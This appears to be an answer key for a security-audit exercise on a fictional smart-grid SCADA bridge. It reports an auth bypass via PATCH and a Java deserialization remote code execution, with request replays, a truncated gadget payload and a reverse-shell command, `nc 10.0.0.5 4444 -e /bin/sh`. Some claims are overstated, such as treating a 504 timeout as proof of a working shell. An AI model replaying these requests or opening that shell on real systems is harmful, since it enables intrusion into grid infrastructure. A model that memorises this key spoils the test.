# Expected Response

## System
- **Name:** GridCore Demand Response & SCADA Bridge
- **Domain:** Energy / Smart Grid / Industrial Control Systems (ICS)
- **Document version analysed:** 6.1.0 (FINAL) + implementation doc 4.1.0

---

## Priority Findings

### Finding 1 — HTTP Method Tampering: Kong Gateway Auth Plugin Bypassed via PATCH Request (Pattern 1.6 — HTTP method tampering / WAF bypass)
**Severity:** Critical / Authentication Bypass (NERC CIP Violation)
**Affected endpoint:** `POST/PATCH https://api.gridcore.energy/api/v1/grid/assets/state-report`
**Referenced in context:** Section 4.0 (Pattern 1.6), Section 5.0 (Lua plugin code), Section 6.0 (Spring Boot controller), HAR trace

**Summary:**
The Kong Gateway's custom Lua auth plugin (`handler.lua`, Section 5.0) enforces token validation with an explicit allow-list of HTTP methods:
```lua
if method == "POST" or method == "GET" then
    -- validate token
end
-- Request passes to upstream SCADA Bridge (no validation for PATCH/PUT/DELETE)
```
Any request using `PATCH`, `PUT`, or `DELETE` completely bypasses the auth block. The plugin does not fail-closed; it silently passes the request to the upstream Java SCADA Bridge without any token validation.

The Spring Boot controller (`ScadaBridgeController`, Section 6.0) uses `@RequestMapping(value = "/state-report")` without specifying `method = RequestMethod.POST`. Spring Boot therefore maps **any** HTTP method to this handler — including `PATCH`.

**Evidence from HAR:**
- Request method: `PATCH` (not `POST`)
- `X-Grid-Auth: INVALID_TOKEN_BYPASS` — deliberately invalid token
- Response: `504 Gateway Timeout` (30+ seconds), not `401 Unauthorized` — the request was forwarded to the upstream Java service, not rejected at the edge
- `x-kong-response-latency: 30005` — 30-second latency confirms the Java service received the request and is actively processing it (or blocking waiting on a spawned process)

---

### Finding 2 — Insecure Java Deserialization: Apache Commons Collections Gadget Chain via `readObject()` (Pattern 10.3 — Insecure deserialization)
**Severity:** Critical / Remote Code Execution on SCADA IT/OT Bridge Server
**Affected endpoint:** `PATCH https://api.gridcore.energy/api/v1/grid/assets/state-report` (after method bypass)
**Referenced in context:** Section 4.0 (RISK-ICS-004, Pattern 10.3), Section 6.0 (Java code), HAR trace

**Summary:**
The `processStateReport` Java handler (Section 6.0) decodes the base64 body and calls `new ObjectInputStream(bais)` then `ois.readObject()` with no class allowlist and no serialization filter:
```java
ObjectInputStream ois = new ObjectInputStream(bais);
GridStateReport report = (GridStateReport) ois.readObject();
```
The code comment acknowledges: *"The code uses the standard ObjectInputStream without restricting which classes can be instantiated in memory."* The malicious payload (Section 7.0) contains an Apache Commons Collections gadget chain that executes an OS command during deserialization, before the `GridStateReport` cast is attempted.

**Magic bytes detection:**
The payload body begins with `rO0AB` — the base64 encoding of Java serialization magic bytes `0xACED0005`. This prefix is the universal indicator of a Java serialized object stream in a base64-encoded POST body.

**Evidence from HAR:**
- Payload begins with `rO0ABXNyABF...` — Java serialization magic bytes confirmed
- `bodySize: 2845` — significantly larger than a typical legitimate `GridStateReport` (legitimate example in Section 7.1 is much shorter)
- Response: `504 Gateway Timeout`, `time: 30015` ms, `x-kong-response-latency: 30005`
- The 30-second hang is the definitive indicator of a successful reverse shell: the deserialized gadget chain executed `nc 10.0.0.5 4444 -e /bin/sh`, blocking the Java HTTP thread while maintaining an interactive shell connection
- The `504` is **not** a failed attack — it is the standard behavioral signature of successful RCE via deserialization on a Java server behind a 30-second upstream timeout

---

## Evidence Map

| Artifact location | Finding 1 (HTTP Method Bypass) | Finding 2 (Deserialization RCE) |
|---|---|---|
| Section 4.0 | Pattern 1.6 — WAF allows PATCH | RISK-ICS-004 — Java serialization not yet migrated to Protobuf |
| Section 5.0 Lua plugin | `if method == "POST" or method == "GET"` — PATCH passes unauthenticated | — |
| Section 6.0 Java controller | `@RequestMapping` accepts all HTTP methods | `new ObjectInputStream(bais)` + `ois.readObject()` — no class filter |
| HAR request method | `PATCH` with `INVALID_TOKEN_BYPASS` | — |
| HAR payload prefix | — | `rO0AB` — Java serialization magic bytes |
| HAR response code | `504` (not `401`) — request bypassed auth and reached Java backend | `504` — reverse shell blocking HTTP thread |
| HAR time | `30015 ms` — upstream timeout | Same — 30s confirms interactive shell connection |
| HAR x-kong-response-latency | `30005` — Kong waited full 30s for Java response | Same |

---

## Steps to Reproduce

### Finding 1 — HTTP Method Tampering (Auth Bypass Verification)

**Step 1 — Confirm auth enforcement on POST (baseline)**
```
POST https://api.gridcore.energy/api/v1/grid/assets/state-report
X-Grid-Auth: INVALID_TOKEN_TEST
Content-Type: text/plain

dGVzdA==
```
**Expected (secure baseline):** `401 Unauthorized` — `{"error": "Missing Authentication Token"}` or `403 Forbidden` — `{"error": "Invalid Asset Token"}`.

**Step 2 — Attempt PATCH with same invalid token**
```
PATCH https://api.gridcore.energy/api/v1/grid/assets/state-report
X-Grid-Auth: INVALID_TOKEN_BYPASS
Content-Type: text/plain

dGVzdA==
```
**Vulnerable outcome (partial — without deserialization exploit):** Response time > 200ms, response code will be `400 Bad Request` (`{"error": "Invalid telemetry format"}`) from the Java service — the request passed the Kong gateway without auth and reached the Spring Boot backend.
**Secure outcome:** `401 Unauthorized` or `403 Forbidden` — same behavior as the POST method.

### Finding 2 — Deserialization Detection (HAR Replay)

**Step 3 — Identify the payload signature**
Examine the HAR payload body. The presence of `rO0AB` at the start of the base64-encoded body is the definitive Java serialization magic byte signature. Verify:
```bash
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==" | base64 -d | xxd | head -2
```
Expected hex output: `aced 0005 7372 ...` — `AC ED` is the Java serialization stream magic (`0xACED`) and `00 05` is the stream version.

**Step 4 — Submit deserialization payload via PATCH (exact HAR replay)**
```
PATCH https://api.gridcore.energy/api/v1/grid/assets/state-report
X-Grid-Auth: INVALID_TOKEN_BYPASS
Content-Type: text/plain
User-Agent: curl/7.81.0

rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZQgPeBcAwAAeHB3DAAAAAI/QAAAAAAAAXNy...
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `504 Gateway Timeout` after 30,015ms
- `x-kong-response-latency: 30005` — Kong waited 30 full seconds for the Java service to respond
- The 30-second hang is the exploit success indicator: the deserialized gadget chain executed `nc 10.0.0.5 4444 -e /bin/sh`, establishing a reverse shell that blocked the HTTP thread
- If a listener is established at `10.0.0.5:4444`, an interactive shell on the SCADA Bridge host will be received within 2–3 seconds of the 504 response

**Secure outcome:**
- Fast `400 Bad Request` response (< 200ms) — the Java deserialization filter rejected the `GridStateReport` class chain before any gadget execution
- Or: `401 Unauthorized` immediately — the Lua plugin enforced auth on PATCH and never forwarded the request

---

## Remediation

**Finding 1 (HTTP Method Tampering):**
1. Change the Lua plugin logic from an explicit method allow-list to a method block-list approach, or enforce globally: remove the `if method == "POST" or method == "GET" then` condition and apply `validate_token_against_redis(token)` unconditionally on all HTTP methods.
2. In the Spring Boot controller, change `@RequestMapping(value = "/state-report")` to `@PostMapping(value = "/state-report")` — this rejects non-POST methods at the application layer, providing defence in depth.

**Finding 2 (Insecure Deserialization):**
1. Replace `ObjectInputStream` with a filtered version using Java 9+ deserialization filters that restrict allowed classes to `GridStateReport` only. Example: `ois.setObjectInputFilter(FilterClass)`.
2. Migrate to Protocol Buffers (gRPC) as planned in Epic ENRG-311 — protobuf payloads do not execute code during deserialization.
3. Add a WAF rule that blocks any request body beginning with the base64 prefix `rO0AB` (Java serialization) on non-serialization endpoints.
